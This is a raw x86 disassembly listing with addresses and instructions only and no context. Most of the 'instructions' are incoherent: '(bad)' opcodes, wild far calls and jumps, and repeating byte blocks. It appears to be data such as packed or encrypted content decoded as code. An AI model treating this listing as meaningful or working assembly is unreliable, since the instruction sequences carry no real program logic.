  40ffd8:	fdivr  DWORD PTR ds:0xcc008440
  40ffde:	bound  eax,QWORD PTR ds:0xcc840f41
  40ffe4:	inc    ebx
  40ffe5:	add    BYTE PTR [eax+0x0],al
  40ffe8:	inc    eax
  40ffe9:	inc    eax
  40ffea:	inc    eax
  40ffeb:	int3   
  40ffec:	add    BYTE PTR ds:0x62404341,al
  40fff2:	pop    eax
  40fff3:	add    BYTE PTR [ebx+0x40],al
  40fff6:	bound  ecx,QWORD PTR [edi]
  40fff8:	inc    eax
  40fff9:	imul   ecx,DWORD PTR ds:0x36014c28,0xffffffa9
  410000:	ret    
  410001:	inc    esp
  410002:	retf   
  410003:	inc    eax
  410004:	inc    eax
  410005:	inc    eax
  410006:	adc    esi,DWORD PTR [eax+0x40bc515c]
  41000c:	inc    eax
  41000d:	adc    ecx,eax
  41000f:	mov    gs,WORD PTR [ebx+0x4053057a]
  410015:	inc    eax
  410016:	add    al,0xbf
  410018:	and    al,BYTE PTR [ecx-0x37]
  41001b:	jno    0x410065
  41001d:	inc    eax
  41001e:	xor    ebp,DWORD PTR [ebp-0x55]
  410021:	call   0x1281c5b6
  410026:	ret    0x4734
  410029:	retf   
  41002a:	mov    edi,0x32e2404f
  41002f:	add    BYTE PTR [eax],al
  410031:	inc    eax
  410032:	inc    eax
  410033:	cmovno eax,DWORD PTR ds:0x40056243
  41003a:	int3   
  41003b:	add    ah,cl
  41003d:	inc    eax
  41003e:	inc    eax
  41003f:	bound  eax,QWORD PTR [ecx+0x0]
  410042:	add    BYTE PTR [edi],cl
  410044:	inc    ebx
  410045:	inc    eax
  410046:	inc    eax
  410047:	add    BYTE PTR [ecx+0x43],al
  41004a:	add    eax,0x40256240
  41004f:	bound  eax,QWORD PTR [eax]
  410051:	or     edi,DWORD PTR [ebp+0x60]
  410054:	add    al,0x80
  410056:	inc    eax
  410057:	rol    DWORD PTR [ebp+0x3d],0xec
  41005b:	xor    DWORD PTR [eax-0x3b],ecx
  41005e:	inc    esp
  41005f:	test   ebp,eax
  410061:	cwde   
  410062:	bound  eax,QWORD PTR [edi+0x5e]
  410065:	mov    eax,0x34c2c140
  41006a:	clc    
  41006b:	hlt    
  41006c:	sub    BYTE PTR ds:0xdec14740,dl
  410072:	dec    ecx
  410073:	(bad)  
  410074:	(bad)  
  410075:	mov    edi,0xfcebc040
  41007a:	xor    eax,0x40cc0005
  41007f:	inc    ecx
  410080:	inc    eax
  410081:	inc    ebx
  410082:	bound  esp,QWORD PTR ds:0x41400043
  410088:	add    BYTE PTR [eax],al
  41008a:	add    eax,0x43624062
  41008f:	inc    ecx
  410090:	inc    eax
  410091:	inc    eax
  410092:	inc    eax
  410093:	add    eax,0x40624340
  410098:	add    eax,0x40664140
  41009d:	inc    esp
  41009e:	mov    bl,0xbf
  4100a0:	imul   ebp,DWORD PTR [ecx+eax*1],0xe514f62
  4100a7:	sub    dl,BYTE PTR ds:0x3b7dc0c8
  4100ad:	jo     0x41007d
  4100af:	inc    esi
  4100b0:	inc    esp
  4100b1:	ror    DWORD PTR [ecx],0xdc
  4100b4:	ins    DWORD PTR es:[edi],dx
  4100b5:	add    eax,0xdfbf4062
  4100ba:	fs inc eax
  4100bc:	xor    eax,0x444748cb
  4100c1:	ret    0x90c1
  4100c4:	inc    ebp
  4100c5:	je     0x4100c3
  4100c7:	sub    BYTE PTR [edi-0x47829c85],bh
  4100cd:	stos   BYTE PTR es:[edi],al
  4100ce:	ins    BYTE PTR es:[edi],dx
  4100cf:	sub    BYTE PTR [ebp+0x60],al
  4100d2:	ret    0x41c0
  4100d5:	jb     0x41011a
  4100d7:	add    BYTE PTR ds:0x41107840,al
  4100dd:	bound  eax,QWORD PTR [eax+0x40]
  4100e0:	sldt   WORD PTR [eax-0x34]
  4100e4:	js     0x410148
  4100e6:	add    eax,0x40664143
  4100eb:	inc    ebx
  4100ec:	add    BYTE PTR [ecx+0x5],al
  4100ef:	js     0x410131
  4100f1:	bound  eax,QWORD PTR [eax+0x0]
  4100f4:	inc    eax
  4100f5:	dec    eax
  4100f6:	inc    eax
  4100f7:	xor    al,0x76
  4100f9:	pop    ss
  4100fa:	mov    esi,0x2ad4f04f
  4100ff:	dec    edi
  410100:	ret    
  410101:	inc    ecx
  410102:	in     al,dx
  410103:	shl    BYTE PTR [eax+0x1c],0x11
  410107:	xor    al,0x68
  410109:	inc    esi
  41010a:	mov    ah,0x40
  41010c:	mov    eax,0xc124b028
  410111:	pusha  
  410112:	add    eax,0x41c84340
  410117:	inc    ebx
  410118:	inc    eax
  410119:	inc    eax
  41011a:	add    eax,0x434162
  41011f:	inc    eax
  410120:	add    BYTE PTR [edx+0x5],ah
  410123:	inc    eax
  410124:	adc    BYTE PTR [edx+0x40],ah
  410127:	inc    ebx
  410128:	inc    ecx
  410129:	add    eax,0x4340
  41012e:	add    eax,0x404162
  410133:	add    BYTE PTR [eax+0x43],al
  410136:	inc    eax
  410137:	add    eax,0x4f4b110d
  41013c:	retf   
  41013d:	inc    eax
  41013e:	mov    esp,0xc0c1cd44
  410143:	inc    edx
  410144:	inc    edx
  410145:	call   0xf3813eb6
  41014a:	pusha  
  41014b:	cmc    
  41014c:	out    0xc8,eax
  41014e:	fs push esp
  410150:	inc    eax
  410151:	arpl   WORD PTR [ebp+0x7e],dx
  410154:	mov    BYTE PTR [edx+0x10],al
  410157:	test   al,0x70
  410159:	jo     0x41011d
  41015b:	push   ecx
  41015c:	test   al,0x41
  41015e:	arpl   WORD PTR [eax],cx
  410160:	inc    eax
  410161:	adc    esp,DWORD PTR [ecx]
  410163:	inc    eax
  410164:	adc    DWORD PTR [esp+edx*4],esi
  410167:	into   
  410168:	sub    cl,dh
  41016a:	push   esi
  41016b:	and    bh,BYTE PTR [eax+0x44b84647]
  410171:	inc    eax
  410172:	add    BYTE PTR [eax],al
  410174:	inc    ecx
  410175:	inc    ebx
  410176:	add    eax,0x41784062
  41017b:	inc    eax
  41017c:	inc    eax
  41017d:	add    BYTE PTR [edi],cl
  41017f:	bound  eax,QWORD PTR [ebx+0x0]
  410182:	add    eax,0x25006240
  410187:	inc    eax
  410188:	add    eax,0x40254143
  41018d:	add    eax,0x1e620000
  410192:	rol    DWORD PTR [eax+0x41],0xa8
  410196:	adc    DWORD PTR [edx+ebp*1],edi
  410199:	sbb    esi,DWORD PTR ds:0x67b8327c
  41019f:	add    eax,0x55605940
  4101a4:	fs add eax,0x7c406243
  4101aa:	ret    0x6240
  4101ad:	leave  
  4101ae:	inc    ebx
  4101af:	add    BYTE PTR [eax],al
  4101b1:	add    BYTE PTR [ecx+0x40],al
  4101b4:	bound  esp,QWORD PTR [esi+0x0]
  4101b7:	inc    eax
  4101b8:	add    eax,0x5400000
  4101bd:	inc    ecx
  4101be:	inc    eax
  4101bf:	inc    eax
  4101c0:	bound  esp,QWORD PTR ds:0x25050043
  4101c6:	inc    ecx
  4101c7:	inc    ebx
  4101c8:	inc    eax
  4101c9:	test   BYTE PTR [eax+0x0],al
  4101cc:	bound  ebx,QWORD PTR [eax+0x62]
  4101cf:	inc    ecx
  4101d0:	inc    eax
  4101d1:	mov    esp,0x273542f0
  4101d6:	dec    ecx
  4101d7:	push   eax
  4101d8:	inc    edx
  4101d9:	ja     0x410203
  4101db:	hlt    
  4101dc:	push   ecx
  4101dd:	rol    BYTE PTR [eax+0x20],cl
  4101e0:	sbb    ah,BYTE PTR [edi+0xd]
  4101e3:	mov    al,0x3f
  4101e5:	les    eax,FWORD PTR [ecx+edx*2]
  4101e8:	pusha  
  4101e9:	(bad)  
  4101ea:	int    0x5
  4101ec:	jge    0x410214
  4101ee:	dec    edx
  4101ef:	les    esp,FWORD PTR [edx+0x62]
  4101f2:	arpl   WORD PTR [edx+0x10],ax
  4101f5:	bound  eax,QWORD PTR [eax+0x41]
  4101f8:	and    eax,0x40000500
  4101fd:	inc    ebx
  4101fe:	add    eax,0x40624041
  410203:	inc    ebx
  410204:	add    eax,0x43402541
  410209:	bound  eax,QWORD PTR [eax+0x43]
  41020c:	int3   
  41020d:	inc    eax
  41020e:	bound  eax,QWORD PTR [eax]
  410210:	inc    ecx
  410211:	inc    eax
  410212:	inc    eax
  410213:	add    eax,0x40de4005
  410218:	or     BYTE PTR [edx+0x43],dh
  41021b:	stos   BYTE PTR es:[edi],al
  41021c:	inc    eax
  41021d:	or     al,0xc3
  41021f:	dec    ebp
  410220:	call   0x1445:0x4462bcb8
  410227:	inc    eax
  410228:	xlat   BYTE PTR ds:[ebx]
  410229:	bound  ebp,QWORD PTR [ebp+eiz*2+0x3c]
  41022d:	rol    dl,1
  41022f:	outs   dx,BYTE PTR ds:[esi]
  410230:	loop   0x4101d3
  410232:	mov    ecx,DWORD PTR [edi+edx*1+0x15]
  410236:	and    edx,DWORD PTR [ebp+0x629a5563]
  41023c:	les    edx,FWORD PTR [eax+0x48]
  41023f:	inc    ebx
  410240:	daa    
  410241:	test   al,0xa8
  410243:	adc    DWORD PTR [edi-0x2f],ecx
  410246:	sar    DWORD PTR [ecx-0x68],0x7a
  41024a:	adc    dl,BYTE PTR [edx+eiz*2+0x66002540]
  410251:	inc    eax
  410252:	add    eax,0x40404143
  410257:	inc    ebx
  410258:	add    BYTE PTR [eax],al
  41025a:	add    BYTE PTR [edx-0x34],ah
  41025d:	inc    eax
  41025e:	add    eax,0x40004041
  410263:	inc    ecx
  410264:	int3   
  410265:	add    BYTE PTR [ebx-0x7c],al
  410268:	add    eax,0x5406240
  41026d:	bound  eax,QWORD PTR [eax+0x40]
  410270:	in     eax,dx
  410271:	inc    edx
  410272:	call   DWORD PTR fs:[ebp+0x52]
  410276:	mov    eax,0x74a4e5b0
  41027b:	gs inc edx
  41027d:	cs cmp eax,0x6346c1cb
  410283:	mov    WORD PTR [edi+0x23],ds
  410286:	ret    
  410287:	add    al,BYTE PTR [edi+0x69]
  41028a:	dec    esp
  41028b:	mov    WORD PTR [eax+edi*1+0x41c04eb8],?
  410292:	inc    eax
  410293:	adc    eax,0xd2054346
  410298:	inc    eax
  410299:	bound  ebx,QWORD PTR [eax+0x41]
  41029c:	add    eax,0x40404340
  4102a1:	inc    ebx
  4102a2:	inc    eax
  4102a3:	test   BYTE PTR [eax],al
  4102a5:	add    eax,0x40624041
  4102aa:	inc    eax
  4102ab:	add    BYTE PTR [edx+0x5],ah
  4102ae:	inc    ebx
  4102af:	add    BYTE PTR [eax+0x78],al
  4102b2:	inc    ecx
  4102b3:	add    BYTE PTR [eax+0x41],bl
  4102b6:	bound  esp,QWORD PTR [ecx+eax*2]
  4102b9:	adc    DWORD PTR [edx-0x10],esi
  4102bc:	sub    cl,cl
  4102be:	sbb    eax,0x6a6b4062
  4102c3:	inc    ebx
  4102c4:	jl     0x41030e
  4102c6:	inc    eax
  4102c7:	shr    BYTE PTR ds:0xa8bccb5a,0x48
  4102ce:	adc    al,0x36
  4102d0:	push   gs
  4102d2:	inc    ecx
  4102d3:	push   0x84404412
  4102d8:	add    ah,cl
  4102da:	bound  eax,QWORD PTR ds:0xcc840f41
  4102e0:	inc    ebx
  4102e1:	add    BYTE PTR [eax+0x0],al
  4102e4:	inc    eax
  4102e5:	inc    eax
  4102e6:	inc    eax
  4102e7:	int3   
  4102e8:	add    BYTE PTR ds:0x62404341,al
  4102ee:	pop    eax
  4102ef:	add    BYTE PTR [ebx+0x40],al
  4102f2:	bound  ecx,QWORD PTR [edi]
  4102f4:	inc    eax
  4102f5:	push   ebp
  4102f6:	and    eax,0x16c91240
  4102fb:	xchg   esp,eax
  4102fc:	(bad)  
  4102fe:	ret    0xb832
  410301:	push   esp
  410302:	pop    eax
  410303:	inc    ecx
  410304:	rcl    DWORD PTR ds:0xd413d33,0x63
  41030b:	push   ebp
  41030c:	dec    ebx
  41030d:	push   esi
  41030e:	outs   dx,DWORD PTR ds:[esi]
  41030f:	inc    eax
  410310:	pusha  
  410311:	retf   
  410312:	ds in  al,0xc1
  410315:	push   eax
  410316:	shr    DWORD PTR [edi],0xcc
  410319:	inc    esp
  41031a:	fs ds cwde 
  41031d:	add    eax,0x44640d95
  410322:	dec    eax
  410323:	dec    eax
  410324:	pusha  
  410325:	push   es
  410326:	adc    al,0x40
  410328:	nop
  410329:	add    BYTE PTR [eax+0x61],bh
  41032c:	in     eax,0x41
  41032e:	int    0x95
  410330:	mov    esi,0x40000060
  410335:	inc    eax
  410336:	cmovno eax,DWORD PTR ds:0x40056243
  41033d:	int3   
  41033e:	add    ah,cl
  410340:	inc    eax
  410341:	inc    eax
  410342:	bound  eax,QWORD PTR [ecx+0x0]
  410345:	add    BYTE PTR [edi],cl
  410347:	inc    ebx
  410348:	inc    eax
  410349:	inc    eax
  41034a:	add    BYTE PTR [ecx+0x43],al
  41034d:	add    eax,0x40256240
  410352:	bound  eax,QWORD PTR [eax]
  410354:	outs   dx,DWORD PTR ds:[esi]
  410355:	push   ebx
  410356:	xor    al,0x52
  410358:	pop    edi
  410359:	adc    ch,dl
  41035b:	arpl   WORD PTR [ebx],bx
  41035d:	jns    0x4103a0
  41035f:	sbb    eax,ecx
  410361:	jnp    0x41038f
  410363:	js     0x41031d
  410365:	int3   
  410366:	inc    esp
  410367:	mov    esi,0xa83c437f
  41036c:	add    eax,0xc0bfcc78
  410371:	inc    ecx
  410372:	mov    esp,0x4608cb12
  410377:	inc    eax
  410378:	and    eax,0x85516f40
  41037d:	dec    ebx
  41037e:	xor    BYTE PTR [eax+0x59],al
  410381:	sub    al,0xa8
  410383:	retf   
  410384:	stos   DWORD PTR es:[edi],eax
  410385:	cs inc ebp
  410387:	inc    eax
  410388:	ret    0x123f
  41038b:	push   eax
  41038c:	inc    ecx
  41038d:	pop    ss
  41038e:	xchg   DWORD PTR [eax],eax
  410390:	adc    eax,0x40cc0005
  410395:	inc    ecx
  410396:	inc    eax
  410397:	inc    ebx
  410398:	bound  esp,QWORD PTR ds:0x41400043
  41039e:	add    BYTE PTR [eax],al
  4103a0:	add    eax,0x43624062
  4103a5:	inc    ecx
  4103a6:	inc    eax
  4103a7:	inc    eax
  4103a8:	inc    eax
  4103a9:	add    eax,0x40624340
  4103ae:	add    eax,0x40664140
  4103b3:	inc    ecx
  4103b4:	mov    eax,0x40a85c0d
  4103b9:	fcomp  QWORD PTR ds:0xc8cb151f
  4103bf:	adc    BYTE PTR [eax+0x4],al
  4103c2:	lds    eax,FWORD PTR [eax+0x43]
  4103c5:	push   ebx
  4103c6:	mov    eax,0x27f253b8
  4103cb:	and    eax,0x410d4664
  4103d0:	aas    
  4103d1:	pop    ebx
  4103d3:	jns    0x410411
  4103d5:	or     ecx,DWORD PTR [eax+0xe]
  4103d8:	(bad)  
  4103d9:	out    dx,al
  4103da:	stos   DWORD PTR es:[edi],eax
  4103db:	inc    eax
  4103dc:	bound  esi,QWORD PTR [eax]
  4103de:	inc    edx
  4103df:	nop
  4103e0:	dec    edi
  4103e1:	inc    eax
  4103e2:	dec    edi
  4103e3:	sub    eax,0x129463c8
  4103e8:	inc    ebp
  4103e9:	inc    ebx
  4103ea:	add    BYTE PTR ds:0x41107840,al
  4103f0:	bound  eax,QWORD PTR [eax+0x40]
  4103f3:	sldt   WORD PTR [eax-0x34]
  4103f7:	js     0x41045b
  4103f9:	add    eax,0x40664143
  4103fe:	inc    ebx
  4103ff:	add    BYTE PTR [ecx+0x5],al
  410402:	js     0x410444
  410404:	bound  eax,QWORD PTR [eax+0x0]
  410407:	inc    eax
  410408:	shl    BYTE PTR gs:[ebx],0x28
  41040c:	pop    ecx
  41040d:	adc    esp,esp
  41040f:	sbb    DWORD PTR [ebp+0x2e],ecx
  410412:	ja     0x41041a
  410414:	jg     0x410425
  410416:	push   cs
  410417:	fcom   QWORD PTR [eax]
  410419:	inc    ebp
  41041a:	dec    eax
  41041b:	jg     0x41040a
  41041d:	inc    ecx
  41041e:	inc    ebx
  41041f:	inc    eax
  410420:	inc    eax
  410421:	add    eax,0x434162
  410426:	inc    eax
  410427:	add    BYTE PTR [edx+0x5],ah
  41042a:	inc    eax
  41042b:	adc    BYTE PTR [edx+0x40],ah
  41042e:	inc    ebx
  41042f:	inc    ecx
  410430:	add    eax,0x4340
  410435:	add    eax,0x404162
  41043a:	add    BYTE PTR [eax+0x43],al
  41043d:	inc    eax
  41043e:	add    eax,0x4105f23d
  410443:	shl    BYTE PTR [edi+eax*1],0x66
  410447:	bound  eax,QWORD PTR [ecx+ecx*8]
  41044a:	add    al,0x2d
  41044c:	adc    eax,0xd0415462
  410451:	inc    esp
  410452:	inc    edx
  410453:	bound  eax,QWORD PTR [ecx+0x60]
  410456:	jnp    0x410400
  410458:	push   cs
  410459:	inc    esi
  41045a:	inc    eax
  41045b:	add    BYTE PTR [eax],al
  41045d:	inc    ecx
  41045e:	inc    ebx
  41045f:	add    eax,0x41784062
  410464:	inc    eax
  410465:	inc    eax
  410466:	add    BYTE PTR [edi],cl
  410468:	bound  eax,QWORD PTR [ebx+0x0]
  41046b:	add    eax,0x25006240
  410470:	inc    eax
  410471:	add    eax,0x40254143
  410476:	add    eax,0xd0620000
  41047b:	shl    BYTE PTR [edi-0x80],0x71
  41047f:	ret    
  410480:	lock ret 
  410482:	add    esp,DWORD PTR [ecx]
  410484:	inc    edx
  410485:	arpl   WORD PTR [edx-0x68],sp
  410488:	clc    
  410489:	imul   ecx,DWORD PTR [ebp+0xe],0xff83442c
  410490:	add    eax,0x53c0f513
  410495:	inc    ebx
  410496:	add    BYTE PTR [eax],al
  410498:	add    BYTE PTR [ecx+0x40],al
  41049b:	bound  esp,QWORD PTR [esi+0x0]
  41049e:	inc    eax
  41049f:	add    eax,0x5400000
  4104a4:	inc    ecx
  4104a5:	inc    eax
  4104a6:	inc    eax
  4104a7:	bound  esp,QWORD PTR ds:0x25050043
  4104ad:	inc    ecx
  4104ae:	inc    ebx
  4104af:	inc    eax
  4104b0:	test   BYTE PTR [eax+0x0],al
  4104b3:	bound  ebx,QWORD PTR [eax+0x62]
  4104b6:	inc    ecx
  4104b7:	inc    eax
  4104b8:	test   al,0x65
  4104ba:	bound  eax,QWORD PTR [edi+0x402388f9]
  4104c0:	adc    DWORD PTR [eax-0x8bfbf7d],ebp
  4104c6:	jmp    0x4041:0xc37c5233
  4104cd:	je     0x4104d2
  4104cf:	sbb    dl,BYTE PTR [eax]
  4104d1:	cmp    ebx,DWORD PTR [eax-0x3ea8bf88]
  4104d7:	pop    edi
  4104d8:	or     al,0x62
  4104da:	retf   
  4104db:	and    al,0x40
  4104dd:	and    eax,DWORD PTR [esi+0x40]
  4104e0:	int    0x12
  4104e2:	inc    ecx
  4104e3:	lfs    edx,FWORD PTR [ebx]
  4104e6:	rcl    BYTE PTR [eax],0x62
  4104e9:	inc    eax
  4104ea:	inc    ecx
  4104eb:	and    eax,0x40000500
  4104f0:	inc    ebx
  4104f1:	add    eax,0x40624041
  4104f6:	inc    ebx
  4104f7:	add    eax,0x43402541
  4104fc:	bound  eax,QWORD PTR [eax+0x43]
  4104ff:	int3   
  410500:	inc    eax
  410501:	bound  eax,QWORD PTR [eax]
  410503:	inc    ecx
  410504:	inc    eax
  410505:	inc    eax
  410506:	add    eax,0x70b8bc05
  41050b:	inc    ebp
  41050c:	mov    WORD PTR ds:0x4540054b,es
  410512:	imul   esp,eax,0x51b58749
  410518:	sub    al,0xe9
  41051a:	bound  esp,QWORD PTR [edi]
  41051c:	fcom   DWORD PTR [eax+0x1f]
  41051f:	ret    0x241b
  410522:	aad    0xa8
  410524:	ins    BYTE PTR es:[edi],dx
  410525:	inc    ebp
  410526:	inc    edx
  410527:	jg     0x41056b
  410529:	(bad)  
  41052a:	int    0x40
  41052c:	dec    edi
  41052d:	push   0x8813273b
  410532:	jp     0x41055e
  410534:	hlt    
  410535:	mov    esp,0x6272c742
  41053a:	inc    eax
  41053b:	and    eax,0x5406600
  410540:	inc    ebx
  410541:	inc    ecx
  410542:	inc    eax
  410543:	inc    eax
  410544:	inc    ebx
  410545:	add    BYTE PTR [eax],al
  410547:	add    BYTE PTR [edx-0x34],ah
  41054a:	inc    eax
  41054b:	add    eax,0x40004041
  410550:	inc    ecx
  410551:	int3   
  410552:	add    BYTE PTR [ebx-0x7c],al
  410555:	add    eax,0x5406240
  41055a:	bound  ebx,QWORD PTR [esi+ebx*1]
  41055d:	dec    ecx
  41055e:	in     al,0x63
  410560:	aas    
  410561:	inc    esi
  410562:	inc    ebp
  410563:	push   ebp
  410564:	arpl   WORD PTR [edx],bp
  410566:	add    eax,0x76c04163
  41056b:	retf   
  41056c:	push   eax
  41056d:	push   0xffffff87
  41056f:	push   eax
  410570:	xor    esi,DWORD PTR [ebx]
  410572:	inc    eax
  410573:	inc    ecx
  410574:	add    eax,0x43660e3d
  410579:	xchg   esi,eax
  41057a:	inc    eax
  41057b:	bound  ebx,QWORD PTR [eax+0x41]
  41057e:	add    eax,0x40404340
  410583:	inc    ebx
  410584:	inc    eax
  410585:	test   BYTE PTR [eax],al
  410587:	add    eax,0x40624041
  41058c:	inc    eax
  41058d:	add    BYTE PTR [edx+0x5],ah
  410590:	inc    ebx
  410591:	add    BYTE PTR [eax+0x78],al
  410594:	inc    ecx
  410595:	add    BYTE PTR [eax+0x41],bl
  410598:	(bad)  
  410599:	retf   
  41059a:	sbb    cl,bl
  41059c:	test   al,0x7b
  41059e:	inc    eax
  41059f:	xor    edi,eax
  4105a1:	cmp    BYTE PTR ss:[edx],dl
  4105a4:	adc    eax,0x41e50162
  4105a9:	inc    eax
  4105aa:	call   0xe319:0x9d497b54
  4105b1:	sub    DWORD PTR [eax-0x7bbf4feb],eax
  4105b7:	add    ah,cl
  4105b9:	bound  eax,QWORD PTR ds:0xcc840f41
  4105bf:	inc    ebx
  4105c0:	add    BYTE PTR [eax+0x0],al
  4105c3:	inc    eax
  4105c4:	inc    eax
  4105c5:	inc    eax
  4105c6:	int3   
  4105c7:	add    BYTE PTR ds:0x62404341,al
  4105cd:	pop    eax
  4105ce:	add    BYTE PTR [ebx+0x40],al
  4105d1:	bound  ecx,QWORD PTR [edi]
  4105d3:	inc    eax
  4105d4:	nop
  4105d5:	inc    esp
  4105d6:	push   edi
  4105d7:	inc    esp
  4105d8:	jb     0x410605
  4105da:	retf   
  4105db:	adc    eax,0xb393e16e
  4105e0:	inc    eax
  4105e1:	xor    eax,0xac46cb01
  4105e6:	pop    eax
  4105e7:	inc    eax
  4105e8:	xor    BYTE PTR [edi+0x45],al
  4105eb:	dec    ebx
  4105ec:	sub    bl,cl
  4105ee:	mov    ch,0x3
  4105f0:	dec    esi
  4105f1:	dec    eax
  4105f2:	or     edi,DWORD PTR [eax-0xd]
  4105f5:	adc    eax,0x3d404079
  4105fa:	pusha  
  4105fb:	int3   
  4105fc:	test   al,0x45
  4105fe:	push   ebx
  4105ff:	push   DWORD PTR [ebx]
  410601:	ret    
  410602:	arpl   WORD PTR [ebp+0x10],dx
  410605:	bound  edi,QWORD PTR [edi-0x43ce29bd]
  41060b:	repnz mov ah,0x0
  41060e:	add    BYTE PTR [eax+0x40],al
  410611:	cmovno eax,DWORD PTR ds:0x40056243
  410618:	int3   
  410619:	add    ah,cl
  41061b:	inc    eax
  41061c:	inc    eax
  41061d:	bound  eax,QWORD PTR [ecx+0x0]
  410620:	add    BYTE PTR [edi],cl
  410622:	inc    ebx
  410623:	inc    eax
  410624:	inc    eax
  410625:	add    BYTE PTR [ecx+0x43],al
  410628:	add    eax,0x40256240
  41062d:	bound  eax,QWORD PTR [eax]
  41062f:	pushf  
  410630:	pop    ecx
  410631:	inc    ebp
  410632:	inc    ecx
  410633:	stos   DWORD PTR es:[edi],eax
  410634:	or     eax,0x536541e4
  410639:	adc    DWORD PTR [ebp+0x45],0x480e62c9
  410640:	ds (bad) 
  410642:	jb     0x4106c0
  410644:	push   esi
  410645:	test   eax,0x427445d0
  41064a:	inc    ecx
  41064b:	inc    eax
  41064c:	das    
  41064d:	aam    0x5
  41064f:	add    ah,cl
  410651:	inc    eax
  410652:	inc    ecx
  410653:	inc    eax
  410654:	inc    ebx
  410655:	bound  esp,QWORD PTR ds:0x41400043
  41065b:	add    BYTE PTR [eax],al
  41065d:	add    eax,0x43624062
  410662:	inc    ecx
  410663:	inc    eax
  410664:	inc    eax
  410665:	inc    eax
  410666:	add    eax,0x40624340
  41066b:	add    eax,0x40664140
  410670:	inc    edx
  410671:	int    0x21
  410673:	outs   dx,BYTE PTR ds:[esi]
  410674:	(bad)  
  410675:	push   edx
  410676:	dec    edx
  410677:	mov    dl,0x28
  410679:	call   0xd824:0x2422fca
  410680:	adc    ch,BYTE PTR [eax+0x142c45f3]
  410686:	ins    BYTE PTR es:[edi],dx
  410687:	inc    ecx
  410688:	cld    
  410689:	adc    BYTE PTR [edi+0x69],al
  41068c:	inc    eax
  41068d:	bound  eax,QWORD PTR [eax-0x18]
  410690:	adc    eax,0x2141ddbc
  410695:	inc    ebx
  410696:	add    BYTE PTR ds:0x41107840,al
  41069c:	bound  eax,QWORD PTR [eax+0x40]
  41069f:	sldt   WORD PTR [eax-0x34]
  4106a3:	js     0x410707
  4106a5:	add    eax,0x40664143
  4106aa:	inc    ebx
  4106ab:	add    BYTE PTR [ecx+0x5],al
  4106ae:	js     0x4106f0
  4106b0:	bound  eax,QWORD PTR [eax+0x0]
  4106b3:	inc    eax
  4106b4:	dec    eax
  4106b5:	pop    edx
  4106b6:	ror    ch,1
  4106b8:	add    eax,0xc2405d04
  4106bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106be:	test   al,0x11
  4106c0:	retf   
  4106c1:	xchg   edi,eax
  4106c2:	inc    eax
  4106c3:	sub    BYTE PTR [ebp+0x12a441be],bl
  4106c9:	push   esi
  4106ca:	and    DWORD PTR [edx],edi
  4106cc:	arpl   bp,ax
  4106ce:	sub    al,BYTE PTR [ebp+0x50]
  4106d1:	repz gs inc eax
  4106d4:	fisub  WORD PTR [eax+edx*1-0x11]
  4106d8:	adc    eax,0x3081416b
  4106dd:	test   BYTE PTR [edx+0x38],0x41
  4106e1:	inc    ebx
  4106e2:	inc    eax
  4106e3:	inc    eax
  4106e4:	add    eax,0x434162
  4106e9:	inc    eax
  4106ea:	add    BYTE PTR [edx+0x5],ah
  4106ed:	inc    eax
  4106ee:	adc    BYTE PTR [edx+0x40],ah
  4106f1:	inc    ebx
  4106f2:	inc    ecx
  4106f3:	add    eax,0x4340
  4106f8:	add    eax,0x404162
  4106fd:	add    BYTE PTR [eax+0x43],al
  410700:	inc    eax
  410701:	add    eax,0x50132cb
  410706:	mov    ah,0x44
  410708:	inc    edi
  410709:	push   eax
  41070a:	inc    edi
  41070b:	lahf   
  41070c:	inc    ecx
  41070d:	dec    esi
  41070e:	and    DWORD PTR [eax+eiz*8],ebp
  410711:	rol    BYTE PTR [esi-0x1e],0xfb
  410715:	inc    eax
  410716:	xor    eax,0x4042dbbc
  41071b:	add    BYTE PTR [eax],al
  41071d:	inc    ecx
  41071e:	inc    ebx
  41071f:	add    eax,0x41784062
  410724:	inc    eax
  410725:	inc    eax
  410726:	add    BYTE PTR [edi],cl
  410728:	bound  eax,QWORD PTR [ebx+0x0]
  41072b:	add    eax,0x25006240
  410730:	inc    eax
  410731:	add    eax,0x40254143
  410736:	add    eax,0xe0620000
  41073b:	mov    edi,0xd5442d4b
  410740:	test   al,0x2a
  410742:	cmp    cl,BYTE PTR [ecx]
  410744:	inc    eax
  410745:	pop    edx
  410746:	inc    ecx
  410747:	jnp    0x4107ae
  410749:	inc    ebp
  41074a:	test   al,0x58
  41074c:	mov    eax,ds:0xeefe3940
  410751:	sub    dl,BYTE PTR [ecx]
  410753:	ds push edi
  410755:	cmp    cl,BYTE PTR [ecx]
  410757:	inc    esp
  410758:	bound  eax,QWORD PTR [eax]
  41075a:	and    eax,0x24124047
  41075f:	sub    al,0x11
  410761:	sub    ah,BYTE PTR [ebx]
  410763:	jmp    DWORD PTR [esp+eax*2]
  410766:	cld    
  410767:	mov    edx,0x69774338
  41076c:	arpl   WORD PTR [edi],sp
  41076e:	sub    al,BYTE PTR [eax+0x62]
  410771:	dec    esp
  410772:	fcom   DWORD PTR [esi+0x40]
  410775:	retf   0x43
  410778:	add    BYTE PTR [eax],al
  41077a:	inc    ecx
  41077b:	inc    eax
  41077c:	bound  esp,QWORD PTR [esi+0x0]
  41077f:	inc    eax
  410780:	add    eax,0x5400000
  410785:	inc    ecx
  410786:	inc    eax
  410787:	inc    eax
  410788:	bound  esp,QWORD PTR ds:0x25050043
  41078e:	inc    ecx
  41078f:	inc    ebx
  410790:	inc    eax
  410791:	test   BYTE PTR [eax+0x0],al
  410794:	bound  ebx,QWORD PTR [eax+0x62]
  410797:	inc    ecx
  410798:	inc    eax
  410799:	(bad)  
  41079a:	int    0xac
  41079c:	xor    al,0x40
  41079e:	shl    DWORD PTR [eax],cl
  4107a0:	inc    edx
  4107a1:	jle    0x41080c
  4107a3:	add    eax,0x4b2280c9
  4107a8:	adc    eax,0x80c9b8b4
  4107ad:	outs   dx,BYTE PTR ds:[esi]
  4107ae:	xchg   ebp,eax
  4107af:	adc    BYTE PTR [edx+0x40],ah
  4107b2:	inc    ecx
  4107b3:	and    eax,0x40000500
  4107b8:	inc    ebx
  4107b9:	add    eax,0x40624041
  4107be:	inc    ebx
  4107bf:	add    eax,0x43402541
  4107c4:	bound  eax,QWORD PTR [eax+0x43]
  4107c7:	int3   
  4107c8:	inc    eax
  4107c9:	bound  eax,QWORD PTR [eax]
  4107cb:	inc    ecx
  4107cc:	inc    eax
  4107cd:	inc    eax
  4107ce:	add    eax,0x52274205
  4107d3:	pop    esi
  4107d4:	and    al,0x94
  4107d6:	(bad)  
  4107d7:	pop    ebp
  4107d8:	and    al,0x40
  4107da:	dec    eax
  4107db:	xchg   ebp,eax
